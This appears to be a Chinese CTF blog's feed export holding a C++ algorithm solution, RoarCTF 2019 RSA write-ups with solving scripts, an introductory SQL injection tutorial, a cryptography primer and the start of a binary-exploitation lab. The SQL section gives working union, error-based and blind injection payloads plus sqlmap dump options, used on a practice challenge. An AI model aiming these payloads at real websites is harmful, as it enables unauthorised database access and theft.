12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;iostream&gt;#include&lt;algorithm&gt;using namespace std;struct food&#123; double J; double F; double value;&#125;M[1005];//按照权重贪心 bool cmp(food a,food b)&#123; return a.value&gt;b.value;&#125;int main()&#123; int m,n; while(cin&gt;&gt;m&gt;&gt;n &amp;&amp; (m!=-1 &amp;&amp; n!=-1)) &#123; double sum = 0; for(int i = 0 ; i &lt; n ; i++) &#123; cin&gt;&gt;M[i].J&gt;&gt;M[i].F; M[i].value = M[i].J*1.0/M[i].F; &#125; sort(M,M+n,cmp); for(int i = 0 ; i &lt; n; i++) &#123; if(M &lt; 0) break; if(M[i].F &gt; m) &#123; sum += m*1.0*M[i].J/M[i].F; m = 0; &#125; else &#123; sum += M[i].J; m -= M[i].F; &#125; &#125; printf("%.3lf\n",sum); &#125;&#125; 1010 Tempter of the BoneProblem Description 123The doggie found a bone in an ancient maze, which fascinated him a lot. However, when he picked it up, the maze began to shake, and the doggie could feel the ground sinking. He realized that the bone was a trap, and he tried desperately to get out of this maze.The maze was a rectangle with sizes N by M. There was a door in the maze. At the beginning, the door was closed and it would open at the T-th second for a short period of time (less than 1 second). Therefore the doggie had to arrive at the door on exactly the T-th second. In every second, he could move one block to one of the upper, lower, left and right neighboring blocks. Once he entered a block, the ground of this block would start to sink and disappear in the next second. He could not stay at one block for more than one second, nor could he move into a visited block. Can the poor doggie survive? Please help him. Input 12345678The input consists of multiple test cases. The first line of each test case contains three integers N, M, and T (1 &lt; N, M &lt; 7; 0 &lt; T &lt; 50), which denote the sizes of the maze and the time at which the door will open, respectively. The next N lines give the maze layout, with each line containing M characters. A character is one of the following:‘X’: a block of wall, which the doggie cannot enter;‘S’: the start point of the doggie;‘D’: the Door; or‘.’: an empty block.The input is terminated with three 0’s. This test case is not to be processed. Output 1For each test case, print in one line “YES” if the doggie can survive, or “NO” otherwise. Sample Input 123456789104 4 5S.X...X...XD....3 4 5S.X...X....D0 0 0 Sample Output 12NOYES]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>HDU</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RoarCTF2019]]></title>
    <url>%2F2019%2F10%2F12%2FRoarCTF2019%2F</url>
    <content type="text"><![CDATA[这次roarCTF就简单看了看两道RSA的题目，感觉还是有新意的，现在特地记录一下 rsa123456A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/xp=next_prime(z*x*y)q=next_prime(z)A = 2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724n = 117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127c = 41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128 很明显，这里需要我们通过A和n的值来求出p,q的值，进而求出私钥d，最后进行解密。 我们先进行第一步，将x,y进行爆破： 1234567891011121314#coding=utf-8A = 2683349182678714524247469512793476009861014781004924905484127480308161377768192868061561886577048646432382128960881487463427414176114486885830693959404989743229103516924432512724195654425703453612710310587164417035878308390676612592848750287387318129424195208623440294647817367740878211949147526287091298307480502897462279102572556822231669438279317474828479089719046386411971105448723910594710418093977044179949800373224354729179833393219827789389078869290217569511230868967647963089430594258815146362187250855166897553056073744582946148472068334167445499314471518357535261186318756327890016183228412253724num = 0#由于有指数2019，推测，x,y的值应该不会超过1000for x in range(1,1000): for y in range(1,1000): if((x%y)!=0 and x!=0 and y!=0): num = (((y%x)**5)%(x%y))**2019+y**316+(y+1)/x if(num == A): print("x:",x) print("y:",y)#x = 2#y = 83 得到x,y之后，我们可以利用n=p*q对z的取值进行爆破: 12345678910111213141516171819202122232425#coding=utf-8import sympyimport mathn=117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127#m即是sqrt(n/166)的近似值m=sympy.nextprime(842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458029)c=86974685960185109994565885227776590430584975317324687072143606337834618757975096133503732246558545817823508491829181296701578862445122140544748432956862934052663959903364809344666885925501943806009045214347928716791730159539675944914294533623047609564608561054087106518420308176681346465904692545308790901579479104745664756811301111441543090132246542129700485721093162972711529510721321996972649182594310700996042178757282311887765329548031672904349916667094862779984235732091664623511790424370705655016549911752412395937963400908229932716593592702387850259325784109798223415344586624970470351548381110529919234353p=0q=0#从m附近查找q或pwhile(m&gt;100): if(n%m==0): p=m q=n/p print("p=") print p print("q=") print q break m=sympy.nextprime(m)#p#c#q#139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 然后就可以求出d: 1234567891011121314151617181920212223242526272829303132333435363738394041424344# coding = utf-8def computeD(fn, e): (x, y, r) = extendedGCD(fn, e) #y maybe &lt; 0, so convert it if y &lt; 0: return fn + y return y def extendedGCD(a, b): #a*xi + b*yi = ri if b == 0: return (1, 0, a) #a*x1 + b*y1 = a x1 = 1 y1 = 0 #a*x2 + b*y2 = b x2 = 0 y2 = 1 while b != 0: q = a / b #ri = r(i-2) % r(i-1) r = a % b a = b b = r #xi = x(i-2) - q*x(i-1) x = x1 - q*x2 x1 = x2 x2 = x #yi = y(i-2) - q*y(i-1) y = y1 - q*y2 y1 = y2 y2 = y return(x1, y1, a) p = 842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 q = 139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183e = 65537 n = p * qfn = (p - 1) * (q - 1) d = computeD(fn, e)print("d:",d)#8599589881775512182490339390302384847126810744233969198532121090013876515514061191844004921719994842305490870513682688025890863319222633068753414378485078624510630709922513396281417153363777832648184544232199294766471900485392788050293515601012127448268872412182805907996901141107293140818104160339368182321217372234809523842344722549604286239338414176997138752498663184064331483582259621245748238876057665171100280468834141443144340932719393320666917904802256624401993129580989389345716562456345455121702090606106185465724822179950100180548721991615891176882567105125169912160252167465495939533501038099782250065 然后就可以直接解密了： 12345678910111213#coding:utf-8from Crypto.Util.number import long_to_bytes n =117930806043507374325982291823027285148807239117987369609583515353889814856088099671454394340816761242974462268435911765045576377767711593100416932019831889059333166946263184861287975722954992219766493089630810876984781113645362450398009234556085330943125568377741065242183073882558834603430862598066786475299918395341014877416901185392905676043795425126968745185649565106322336954427505104906770493155723995382318346714944184577894150229037758434597242564815299174950147754426950251419204917376517360505024549691723683358170823416757973059354784142601436519500811159036795034676360028928301979780528294114933347127d = 8599589881775512182490339390302384847126810744233969198532121090013876515514061191844004921719994842305490870513682688025890863319222633068753414378485078624510630709922513396281417153363777832648184544232199294766471900485392788050293515601012127448268872412182805907996901141107293140818104160339368182321217372234809523842344722549604286239338414176997138752498663184064331483582259621245748238876057665171100280468834141443144340932719393320666917904802256624401993129580989389345716562456345455121702090606106185465724822179950100180548721991615891176882567105125169912160252167465495939533501038099782250065c = 41971850275428383625653350824107291609587853887037624239544762751558838294718672159979929266922528917912189124713273673948051464226519605803745171340724343705832198554680196798623263806617998072496026019940476324971696928551159371970207365741517064295956376809297272541800647747885170905737868568000101029143923792003486793278197051326716680212726111099439262589341050943913401067673851885114314709706016622157285023272496793595281054074260451116213815934843317894898883215362289599366101018081513215120728297131352439066930452281829446586562062242527329672575620261776042653626411730955819001674118193293313612128m=pow(c,d,n)#本来这里想使用libnum的一个库来着，但是可能因为某种玄虚原因不太行，所以以后字符串的转换还是使用pycryptoprint(long_to_bytes(m))#RoarCTF&#123;wm-l1l1ll1l1l1l111ll&#125; babyRSA1234567891011121314151617181920212223242526272829import sympyimport randomdef myGetPrime(): A= getPrime(513) print(A) B=A-random.randint(1e3,1e5) print(B) return sympy.nextPrime((B!)%A)p=myGetPrime()#A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407#B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596#p=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140651q=myGetPrime()#A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927#B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026#q=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351043r=myGetPrime()#r = 237546113044253096281605033809113626736013565483812642295460095292363136024662398343531093674459197466191288877320101248913883958536348617639742373951502n=p*q*r#n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733c=pow(flag,e,n)#e=0x1001#c=38620963949231568493951852806812359956058522979245676395704780066879051018892175913415575431734194586035432099562300809271498658506900105389975586615280808081596988894713047252672924018208747721253303054480800386069769084714127190055658807083226038640292692679215406182331245636616583141043207599068234065117886147748321058731290102675088056205224134057176167818706519201527516421824645801542347535393294450756726281744763656819345306146716190523210020241675468#so,what is the flag? 以前没做过这种题目，现在遇到正好积累一下，关于三个合数的RSA 这里需要用到一个数学结论: wilson定理，公式表达大概如下，此处p为素数$$(p-1)!\ = \ -1\ mod\ (p)$$应用：快速求阶乘$$n&lt;p: \qquad \qquad \qquad \qquad \qquad \qquad \qquad \qquad \qquad \qquad \qquad \qquad \qquad \qquad \n![(n+1)(n+2)···(p-1)] = -1\ mod\ (p) \qquad \qquad\qquad \令p = n-x: \qquad \qquad \qquad \qquad \qquad \qquad \qquad \qquad\qquad \qquad \qquad \qquad \qquad\n![(p-x+1)(p-x+2)···(p-1)] = (p-1)\ mod\ (p) \那么：\qquad \qquad\qquad \qquad\qquad \qquad\qquad \qquad\qquad \qquad\qquad \qquad\qquad \qquad\quad \(n!)’ = (p-x+1)(p-x+2)···(p-2) \qquad \qquad\qquad \quad$$ 解密脚本如下： 12345678910111213141516171819202122232425#coding=utf-8from Crypto.Util.number import long_to_bytesimport gmpy2def myGetPrime(A,B): ans=1 for i in range(B+1,A-1): ans=(i*ans)%A s=gmpy2.invert(ans,A) return gmpy2.next_prime(s)A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733e=0x1001p=myGetPrime(A1,B1)q=myGetPrime(A2,B2)r=n//(p*q)phi=(r-1)*(q-1)*(p-1)d=gmpy2.invert(e,phi)enc=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428m=pow(enc,d,n)print(long_to_bytes(m).decode()) RoarCTF{wm-CongrAtu1ation4-1t4-ju4t-A-bAby-R4A}]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL注入入门]]></title>
    <url>%2F2019%2F07%2F25%2FSQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[判断有无引号 根据字段的意义或输入的值 Name/可以输入字母或符号 Id/输入是数字 运算测试id=2-1 结果与id=1一样，说明2-1被执行，没有被引号包裹 结果与id=2一样，说明2-1被当做字符串先进行了类型转换，再执行，有引号 判断单双引号 一般来说可以直接用转义字符进行判断 ps:上面这个bugku上的成绩单一题是利用post进行传值 这里的后台就可以认为是单引号 1Select * from table1 where id = ‘$id’ Union进行注入 将两个或多个查询的结果合并到一个结果集中。 所有查询中的列数和列的顺序必须相同。数据类型必须兼容。 确定列数 方法一：union select 1,2,3…，尝试到报错之前的那个数就是列数 方法二：order by 1..…，也是尝试到报错之前的那个数就是列数 确定显示字段1234//mysql中一些基础知识1. -- 与后面的这个单引号连接在一起，无法形成有效的mysql语句2. --+ 加号与上面的区别就是多了一个空格符，-- -也有一样的效果3. # 会注释掉后面的语句 information_schema这个数据库存放的是数据库和数据表的元信息 看数据库 1select schema_name from information_schema.schemata; 看表名 1select table_name from information_schema.tables; 看列名 1select column_name from information_schema.columns; 12#格式select group_concat(column_name) from information_schema.columns where table_name=‘xxx’/0x…; 根据已知信息查数据 Select group_concat(列名) from 数据库名.表名; Sqlmap -–dbs 枚举数据库管理系统数据库 -–tables 枚举的 DBMS 数据库中的表 -T 指定 -–columns 枚举 DBMS 数据库表列 -C 指定 -–dump 转储数据库管理系统的数据库中的表项 报错注入updatexml UPDATEXML (XML_document, XPath_string, new_value); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc； 第二个参数：XPath_string (Xpath格式的字符串)。 第三个参数：new_value，是String格式，替换查找到的符合条件的数据。 利用的关键是，updatexml第二个参数需要的是Xpath格式的字符串。如果输入的不符合Xpath格式，将会发生错误。 extractvalue extractvalue函数与updatexml函数基本相同 ，区别在于extractvalue仅有两个参数。 EXTRACTVALUE (XML_document, XPath_string); 第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc 。 第二个参数：XPath_string (Xpath格式的字符串)。 同样的，extractvalue第二个参数需要的是Xpath格式的字符串。如果输入的不符合Xpath格式，将会发生错误。 32.php?id=1 and extractvalue(1,concat(0x7e,(select USER()),0x7e)) 练手题：bugku 成绩单 123456#构造过程id=-1&apos; union select 1,2,3,4# //爆出字段，发现四个都有回显id=-1&apos;union select 1,2,3,database()# //得到数据库的名字skctf_flagid=-1&apos; union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()# //获取表名fl4g,scid=-1&apos; union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&apos;fl4g&apos;# //获取行名skctf_flagid=-1&apos; union select 1,2,3,skctf_flag from fl4g# //读取字段类容 BUGKU{Sql_INJECT0N_4813drd8hz4} 盲注 页面不会返回查询结果 页面状态只有两种，真/假 基于布尔的盲注攻击 攻击者在参数中输入类似“用户名第一个字母是a么”这样的SQL语句，根据页面结果判断真假。如果为真，继续暴力破解第二个字母。如果为假，则更改条件，“用户名第一个字母是b么”，以此类推进行基于布尔的盲注攻击。 SUBSTRING(str,pos,len)，分别代表了被截取字符串、开始截取位置、截取长度。如果没有定义len，则截取至str末尾。pos可以为负值，意思为倒数第几位。 确定长度?id=1 and (select length(group_concat(table_name)) from information_schema.tables where table_schema=database())&lt;4 确定具体内容?id=1 and (select substring(group_concat(table_name),1,1) from information_schema.tables where table_schema=database())=‘a’ 基于时间的盲注 Sleep(5) benchmark(10000000,MD5(1))]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码学基础]]></title>
    <url>%2F2019%2F07%2F24%2F%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[密码学概述 密码：认证以及 保证通信信息的完整性、机密性 认证： 便于授权以及管理 机密性：为了防止信息被窃听，因此需要对信息进行加密，对应的密码技术主要就是对称加密和非对称加密。 完整性：为了防止信息被篡改，因此需要对信息进行完整性校验，对应的密码技术有单向散列函数、消息认证码、数字签名。 不可否认性：为了防止发送者发布信息后否认自己发布过，因此需要证据来证明信息是否由发送者发布，对应的密码技术为数字签名。 过程： 主要思想分组密码：设M为明文，分组密码将M划分为一系列明文块Mi，通常每块包含若干字符，并且对每一块Mi都用同一个密钥Ke进行加密。M=(M1,M2,…,Mn) ，C=(C1,C2 ,…,Cn,)，其中Ci=E(Mi,Ke)，i=1,2…,n。如：DES、AESd 序列密码：将明文和密钥都划分为位(bit)或字符的序列，并且对明文序列中的每一位或字符都用密钥序列中对应的分量来加密。M=(M1,M2,…,Mn) ，Ke=(ke1,ke2,…,ken)，C=(C1,C2,…,Cn)，其中Ci=E(mi,kei)，i=1,2,…,n。 如：RC4 古典密码单表替换密码 加密：将单表替换加密也是逐个字母地加密明文。在加密时，将会按照某种无序的对应规则，并按照这个规则将明文每个字母替换而得到密文。 解密：明文和密文没有明显联系，需要两个人都拿都表来对照。 较短的密码可以观察之后直接爆破，较长的密码可以进行频率分析。 凯撒密码 又称移位密码 就是将26个字母简单的移动位置 1234abcdefghijklmnopqrstuvwxyz--&gt;右移动两个位：yzabcdefghijklmnopqrstuvwx.....其他类似 加密结果只有26种，所以可以直接爆破(用python自己写脚本) 网上有很多在线解密网站，比如：http://ctf.ssleye.com/（但这个网站有的需要收费） 多表代换密码加密后字母不再保持原来的频率。 base64 base64编码，在CTF 中比较常见，base64编码后的字符串的长度一定会被4整除，包括用作后缀的等号吧；如果明文字符数不能被3整除，余1时，1个字符转为2个，补2个等号，共4个字符；余2时，2个字符转为3个字符，补1个等号，共4个字符 base64不仅可以编码字符串，也可以编码图片， 严格来说base64不能算是一种加密，只能说是编码转换，跟ASCII码与Unicode编码一样 http://imgbase64.duoshitong.com 栗子： 1RkxBR3tCSTdfMVNDXzZhYn0= 其他常用古典密码 这个具体就自己搜搜呗 栅栏密码 培根密码 键盘密码 猪圈密码 。。。。。。 现代密码学简介 对称加密 只有一个密钥，加密和解密使用相同的密钥。需要双方协商密钥易泄露，密钥数量大难以管理 非对称加密 一般有公钥(public key)与私钥(private key)。A生成一对密钥，把公钥向其他人公开，自己保留私钥。得到公钥的B把信息加密后发给A，A再用自己的私钥进行解密 现代加密策略 一般先使用非对称加密的方式将对称加密所需的密钥进行加密交换，之后的通信可以通过对称加密进行，结合了二者的优点 RSARSA-数论基础 互质 如果两个正整数，除了1以外，没有其他公因子，我们就称这两个数是互质关系 欧拉函数 小于等于n的正整数中与与n构成互质关系的个数。对于素数p, φ(p)=p-1，对于对两个互质的数p,q， φ(pq)=φ(p)φ(q) = (p-1)(q-1) 模反元素 ab ≡ 1 (mod r), 则a,b互为模r的模反元素 贝祖等式 若设a,b是整数，则存在整数x,y，使得ax+by=gcd(a,b) 定理 ： 如果两个正整数a和n互质，那么一定可以找到整数b，使得ab-1被n整除，或者说ab被n除的余数是1 取模运算与同余的概念 如果存在一个正整数m与两个整数a,b，如果a-b能够被m整除，也就是说m|(a-b),那么a和b模m同余。记为：$$a \equiv b \quad mod(m)$$ 模指数运算 模指数运算即先进行指数运算，之后再进行取模运算。$$a \equiv b^c \quad mod(m)$$ 12#python代码pow(b,c,m) 扩展欧几里得(egcd) 已知a, b求解一组x，y，使它们满足ax+by = gcd(a, b)，这是一个递归的实现方式 简单的证明过程: 设a&gt;b 当b = 0时，gcd(a,b) = a 此时 x = 1 , y = 0 当b&gt;0时 由贝祖等式可知： ​ 对于a,b的解为x1,y1，我们有：$$ax_1 + by_1 = gcd(a,b)$$​ 对于b,a%b的解为x2，y2，我们有：$$bx_2 + (a\%b)y_2 = gcd(b,a\%b)$$由欧几里得算法可知：$$gcd(a,b) = gcd(b,a\%b)$$所以：$$ax_1 + by_1 = bx_2 + (a\%b)y_2$$又：$$a\%b =a-\lfloor \frac{a}{b}\rfloorb$$故：$$ax_1 + by_1 = bx_2 + (a-\lfloor \frac{a}{b} \rfloorb)y_2 \ax_1 + by_1 = ay_2 + (x_2-\lfloor \frac{a}{b} \rfloory_2)b$$所以：$$\begin{array}{{20}{l}} { \left{ \begin{array}{{20}{c}}{x_1 = y_2 }\{y_1 = x_2-\lfloor \frac{a}{b} \rfloory_2 }\\end{array}\right. }\\end{array}$$进行递归求解，最终可以得到x1，y1,扩展欧几里得算法一般用来求模逆，如求解$$28^{-1}mod75$$最终的结果是:$$375-828=1$$所以此时x1=3,y1=-8但在模75范围内，y1=75-8=67 后续利用扩展欧几里得和下列公式求解d。$$e*d \equiv = 1 mod(\varphi(n))$$ 1234567891011121314151617181920212223242526#python实现代码：def extendedGCD(a, b): #a*xi + b*yi = ri if b == 0: return (1, 0, a) #a*x1 + b*y1 = a x1 = 1 y1 = 0 #a*x2 + b*y2 = b x2 = 0 y2 = 1 while b != 0: q = a / b #ri = r(i-2) % r(i-1) r = a % b a = b b = r #xi = x(i-2) - q*x(i-1) x = x1 - q*x2 x1 = x2 x2 = x #yi = y(i-2) - q*y(i-1) y = y1 - q*y2 y1 = y2 y2 = y return(x1, y1, a) RSA加密解密原理常见变量含义 n: 大整数，我们称之为模数(modulus) p,q:大整数的两个素因数(factor),n = p*q e,d:互为模反的两个数，其中{e,n}构成公钥，{d,n}构成私钥 c,m:c = pow(m, e, N)，得到的c即为密文,m = pow(c, d, N)，得到的m即为明文 生成密钥 选择两个大素数p和q，n = p*q 选择一个整数e，满足条件$$1 &lt; e &lt; \varphi(n)\gcd(e,\varphi(n)) = 1$$ 其中{e,n}是公钥，{d,n}是私钥 RSA安全性保障 e的选择不可以太小，否则可能会被爆破 p和q的差值尽可能大一点 d的选择不能太小，也不能太大，一般满足$$d\ge n^{\frac{1}{4}}$$ 基本的攻击方法 基本题型 变种RSARabin算法 e = 2，与RSA类似但这个函数不是单射，一个密文能解出4个明文 取两个大素数p与q，使得p≡q≡3(mod 4)(保证为奇素数) 加密：$$c=m^2 \quad mod( n)$$ 解密：$$m^2≡c \quad mod( n)$$ 理论基础： 二次剩余 $$对于式子y^2 = a \quad mod \quad p,称a是y模p的二次剩余$$ Euler准则 设p为一个奇素数，a是一个正整数。那么a是一个模p二次剩余当且仅当$$a^{\frac{p-1}{2}} \equiv 1\ (mod\ p)$$证明： 充分性 $$假定a\equiv y^2\ (mod\ p)。由欧拉定理可知（p为素数）a^{p-1} \equiv 1(mod\ p) \对于任一a \ne 0 (mod\ p)成立，所以\qquad\qquad\qquad\qquad\qquad\qquad\qquad\a^{\frac{p-1}{2}} \equiv (y^2)^{\frac{p-1}{2}}(mod\ p)\quad \\equiv y^{p-1}(mod\ p) \\equiv 1(mod\ p) \quad \$$ 必要性 $$假定a^{\frac{p-1}{2}}\equiv1(mod\ p)。设b是一个模p的元素。那么a\equiv b^i(mod\ p)对于\某个整数i，我们有\qquad\qquad\qquad\qquad\qquad\qquad\qquad\qquad\qquad\qquad\ \ \a^{\frac{p-1}{2}}\equiv(b^i)^{\frac{p-1}{2}}(mod\ p) \quad \quad\\equiv b^{i(\frac{p-1}{2})}(mod\ p) \由欧拉定理可知，此时i应该为偶数，所以a的平方根为\pm b^{\frac{i}{2}}(mod\ p )\quad\ \$$ p,q要求$$当p \equiv 3\ (mod\ 4)时，有以下公式：\qquad\qquad \qquad\qquad\quad \qquad\qquad\quad \qquad\qquad\quad \qquad\qquad\quad\(\pm \ y^{\frac{p+1}{4}})^2 \equiv y^{\frac{p+1}{2}}(mod\ p) \qquad\qquad\quad \quad \\equiv y^{\frac{p-1}{2}}*y(mod\ p) \ \\equiv y(mod\ p) \qquad \ \ \ \$$ 中国剩余定理 用于求解同余方程组 解密$$y模p的两个平方根为\pm y^{\frac{p+1}{4}}(mod\ p) \y模q的两个平方根为\pm y^{\frac{q+1}{4}}(mod\ q)$$ 由欧拉公式可求解p关于q的模逆以及q关于p的模逆：$$y_p p+y_qq = 1$$由中国剩余定理可知：$$r = (yp p mq + yq q mp)\ mod\ n \ -r = n - r \qquad \qquad \qquad \qquad \qquad \qquad\ s = (yp p mq - yq q mp)\ mod\ n \ -s = n - s \qquad \qquad \qquad \qquad \qquad \qquad \$$ 12345678910111213#python实现脚本#参数待定def rabin_decrypt(c, p, q, e=2): n = p * q mp = pow(c, (p + 1) / 4, p) #整除 ⽤// mq = pow(c, (q + 1) / 4, q) yp = gmpy2.invert(p, q) yq = gmpy2.invert(q, p) r = (yp * p * mq + yq * q * mp) % n rr = n - r s = (yp * p * mq - yq * q * mp) % n ss = n - s return (r, rr, s, ss) 三素数RSA 取三个素数p,q,r 计算n=p*q*r 计算欧拉函数 $$\varphi{n} = (p-1)(q-1)(r-1)$$ 选择一个e值，满足： $$1 &lt; e &lt; \varphi(n)\gcd(e,\varphi(n)) = 1$$ 计算d值，$$e*d \equiv 1 \quad mod(\varphi(n))$$ 正确性证明 椭圆曲线椭圆曲线加密算法，即：Elliptic Curve Cryptography，简称ECC，是基于椭圆曲线数学理论实现的一种非对称加密算法。相比RSA，ECC优势是可以使用更短的密钥，来实现与RSA相当或更高的安全。据研究，160位ECC加密安全性相当于1024位RSA加密，210位ECC加密安全性相当于2048位RSA加密。 椭圆曲线的一般方程为$$y^2 = x^3+ax^2+b^2+c$$ 判别式为$$\Delta (E) = -4a^3c+a^2b^2-4b^3-27c^2+18abc \neq 0$$比如下面这个图： 密码学中用到的椭圆曲线方程一般限定为$$y^2=x^3+ax+b，其中\Delta(E)=4a^3+27b^2 \neq 0$$ 定义椭圆曲线的运算规则 加法 过曲线上的两点A、B画一条直线，找到直线与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A+B，即为加法。如下图所示：A + B = C 二倍运算 此时上述直线与曲线相切，在这种情况下，将椭圆曲线在A点的切线，与椭圆曲线的交点，交点关于x轴对称位置的点，定义为A + A，即2A，即为二倍运算。 正负取反A与-A,坐标相当于关于x轴对称 无穷远为单位元x A+（-A）=O 实数的椭圆曲线椭圆曲线加密解密原理由上述所定义的运算，我们知道，当给定一个点G时，已知一个数k求kG并不困难，但是已知kG我们想要求k却是非常困难。所以我们可以将k当作私钥，K=kG为公钥， 加密过程：选择一个随机数r，将消息M生成密文C，该密文是一个点对C={rG,M+rK} 解密过程：M+rK-k(rG)=M 椭圆曲线签名算法原理 私钥签名： 选择一个随机数r，计算点rG，G(x,y) 根据随机数r、消息M的hash值、私钥k，计算sig = (h+kx)/r (ps:有限域中的除运算都是求逆) 将消息M、和签名{rG,sig} 公钥验证签名： 接收方收到消息M、以及签名{rG, s} 根据消息求哈希h 使用发送方公钥K计算:hG/s+xK/s =rG 为什么需要hash???]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITCON-train]]></title>
    <url>%2F2019%2F07%2F11%2FHITCON-train%2F</url>
    <content type="text"><![CDATA[lab1先看看保护机制 打开了部分可读，而就是可以进行溢出覆盖，打开了栈溢出保护，而且NX打开，不可执行，地址随机化没有打开 现在可以用ida打开看看文件，是32位的，所以就可以直接在ida.exe里面打开 找到mian函数，反编译以下： 看到关键函数get_flag(): 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374v67 = __readgsdword(0x14u); v54 = 'y_oD'; v55 = 'k_uo'; v56 = '_won'; v57 = '_yhw'; v58 = 't_ym'; v59 = 'mmae'; v60 = '_eta'; v61 = 'narO'; v62 = 'i_eg'; v63 = 'os_s'; v64 = 'gna_'; v65 = '??yr'; v66 = '?'; v5 = 7; v6 = 59; v7 = 25; v8 = 2; v9 = 11; v10 = 16; v11 = 61; v12 = 30; v13 = 9; v14 = 8; v15 = 18; v16 = 45; v17 = 40; v18 = 89; v19 = 10; v20 = 0; v21 = 30; v22 = 22; v23 = 0; v24 = 4; v25 = 85; v26 = 22; v27 = 8; v28 = 31; v29 = 7; v30 = 1; v31 = 9; v32 = 0; v33 = 126; v34 = 28; v35 = 62; v36 = 10; v37 = 30; v38 = 11; v39 = 107; v40 = 4; v41 = 66; v42 = 60; v43 = 44; v44 = 91; v45 = 49; v46 = 85; v47 = 2; v48 = 30; v49 = 33; v50 = 16; v51 